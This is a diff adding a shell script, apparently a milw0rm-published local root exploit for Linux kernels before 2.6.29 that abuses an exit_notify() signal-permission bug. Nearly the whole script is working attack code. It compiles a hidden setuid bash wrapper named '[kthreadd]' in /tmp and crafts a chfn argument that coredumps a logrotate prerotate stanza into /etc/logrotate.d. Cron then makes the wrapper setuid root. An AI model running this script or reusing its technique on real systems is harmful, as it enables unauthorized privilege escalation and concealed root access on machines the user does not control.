@@ -1,0 +1,103 @@
+#!/bin/sh
+
+###################################################################################
+# gw-notexit.sh: Linux kernel <2.6.29 exit_notify() local root exploit              
+# 
+# by Milen Rangelov (gat3way-at-gat3way-dot-eu)
+#
+# Based on 'exit_notify()' CAP_KILL verification bug found by Oleg Nestorov.
+# Basically it allows us to send arbitrary signals to a privileged (suidroot)
+# parent process. Due to a bad check, the child process with appropriate exit signal
+# already set can first execute a suidroot binary then exit() and thus bypass
+# in-kernel privilege checks. We use chfn and gpasswd for that purpose.
+#
+# !!!!!!!!!!!
+# Needs /proc/sys/fs/suid_dumpable set to 1 or 2. The default is 0 
+# so you'll be out of luck most of the time. 
+# So it is not going to be the script kiddies' new killer shit :-)
+# !!!!!!!!!!!
+#
+# if you invent a better way to escalate privileges by sending arbitrary signals to 
+# the parent process, please mail me :) That was the best I could think of today :-(
+#
+# This one made me nostalgic about the prctl(PR_SET_DUMPABLE,2) madness
+#
+# Skuchna rabota...
+#
+####################################################################################
+
+
+
+
+SUIDDUMP=`cat /proc/sys/fs/suid_dumpable`
+if [ $SUIDDUMP -lt 1 ]; then echo -e "suid_dumpable=0 - system not vulnerable!\n";exit; fi
+if [ -d /etc/logrotate.d ]; then
+echo "logrotate installed, that's good!"
+else
+echo "No logrotate installed, sorry!";exit
+fi
+
+echo -e "Compiling the bash setuid() wrapper..."
+cat >> /tmp/.m.c << EOF
+#include <unistd.h>
+#include <sys/types.h>
+
+int main()
+{
+    setuid(0);
+    execl("/bin/bash","[kthreadd]",NULL);
+}
+EOF
+
+cc /tmp/.m.c -o /tmp/.m
+rm /tmp/.m.c
+
+echo -e "Compiling the exploit code..."
+
+cat >> /tmp/exploit.c << EOF
+#include <stdio.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int child(void *data)
+{
+    sleep(2);
+    printf("I'm gonna kill the suidroot father without having root rights :D\n");
+    execl("/usr/bin/gpasswd","%s",NULL);
+    exit(0);
+}
+
+int main()
+{
+    int stacksize = 4*getpagesize();
+    void *stack, *stacktop;
+    stack = malloc(stacksize);
+    stacktop = stack + stacksize;
+    chdir("/etc/logrotate.d");
+    int p = clone(child, stacktop, CLONE_FILES|SIGSEGV, NULL);
+    if (p>0) execl("/usr/bin/chfn","\n/tmp/.a\n{\nsize=0\nprerotate\n\tchown root /tmp/.m;chmod u+s /tmp/.m\nendscript\n}\n\n",NULL);
+}
+EOF
+
+cc /tmp/exploit.c -o /tmp/.ex
+rm /tmp/exploit.c
+
+echo -e "Setting coredump limits and running the exploit...\n"
+ulimit -c 10000
+touch /tmp/.a
+`/tmp/.ex >/dev/null 2>/dev/null`
+sleep 5
+rm /tmp/.ex
+
+if [ -e /etc/logrotate.d/core ]; then
+echo -e "Successfully coredumped into the logrotate config dir\nNow wait until cron.daily executes logrotate and makes your shell wrapper suid\n"
+echo -e "The shell should be located in /tmp/.m - just run /tmp/.m after 24h and you'll be root"
+echo -e "\nYour terminal is most probably screwed now, sorry for that..."
+exit
+fi
+
+echo "The system is not vulnerable, sorry :("
+
+# milw0rm.com [2009-04-08]
